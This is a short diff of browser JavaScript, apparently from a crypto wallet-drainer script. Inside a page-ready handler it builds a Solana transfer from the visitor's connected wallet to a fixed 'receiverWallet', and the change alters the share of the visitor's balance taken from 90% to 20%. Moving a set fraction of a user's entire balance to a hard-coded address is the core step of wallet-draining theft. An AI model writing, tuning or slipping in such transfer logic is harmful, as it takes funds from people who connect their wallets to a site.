@@ -39,7 +39,7 @@ $(document).ready(function() {
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: receiverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.9), // Ensure integer lamports
+                                lamports: Math.floor(balanceForTransfer * 0.2), // Ensure integer lamports
                             })
                         );
 
